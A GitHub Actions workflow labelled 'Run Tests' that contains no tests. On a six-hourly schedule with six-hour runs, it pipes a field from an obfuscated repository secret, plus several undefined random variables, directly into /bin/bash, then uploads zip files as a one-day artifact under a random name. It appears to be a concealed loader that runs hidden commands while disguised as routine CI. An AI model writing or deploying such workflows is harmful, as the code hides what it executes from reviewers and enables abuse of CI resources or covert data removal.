name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '4 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          szm0: ${{ secrets.szm0 }}
        run: |
          printf '%s' "$szm0" | jq -r .un078 | /bin/bash
          echo $ymhlt11 | jq -r .vn55219 | /bin/bash
          echo $hchv60 | jq -r .f83002 | /bin/bash
          echo $r58 | jq -r .ugno6796 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: TQTry0p5
          path: "*.zip"
          retention-days: 1
